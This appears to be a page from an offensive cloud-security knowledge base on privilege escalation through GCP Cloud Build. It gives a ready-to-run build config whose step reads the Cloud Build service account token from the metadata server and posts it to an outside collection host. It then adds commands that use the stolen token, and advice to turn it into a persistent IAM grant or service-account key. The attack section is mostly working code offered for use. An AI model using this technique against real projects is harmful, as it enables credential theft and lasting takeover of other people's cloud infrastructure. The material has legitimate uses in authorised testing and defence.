---
title: "Build service account: exfiltrating the Cloud Build token mid-build"
description: "Exfiltrating the Cloud Build service account token during a build and abusing its default project-wide roles."
keywords:
  - Cloud Build
  - service account token
  - Editor
  - build
  - privilege escalation
---

# Build service account

`cloudbuild.builds.create` lets you submit a build, and every build step runs as the Cloud Build service account. Because that account commonly holds project **Editor**, a build step that reads its own metadata token hands you a near-admin credential, with no `actAs` required.

## Exfiltrating the token

```yaml
# cloudbuild.yaml: one step that reads the build SA token and ships it out
steps:
  - name: gcr.io/cloud-builders/curl
    entrypoint: bash
    args:
      - -c
      - |
        TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
          'http://metadata/computeMetadata/v1/instance/service-accounts/default/token')
        curl -s -X POST -d "$TOKEN" https://you.example/collect
```

```bash
gcloud builds submit --config cloudbuild.yaml --no-source
# then use the captured token:
curl -s -H "Authorization: Bearer <access_token>" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<proj>:getIamPolicy -X POST
```

## Exploitation notes

- The Cloud Build SA's effective roles decide the payoff: `gcloud projects get-iam-policy <proj>` confirms whether it still carries Editor or a scoped replacement.
- `--no-source` avoids staging a repo; the inline config is enough to run the step.
- The captured token is short-lived, so chain it immediately into a durable grant (a key on a target SA, or a self-added IAM binding) rather than relying on the token itself.
- This is distinct from the deploy-as-SA paths: no `iam.serviceAccounts.actAs` is needed, only the permission to create a build.

## Tools

- **gcloud** (`builds submit`, `projects get-iam-policy`).

## References

- [Rhino Security Labs: GCP privilege escalation (part 1)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [GCP IAM privilege escalation (Rhino repo)](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
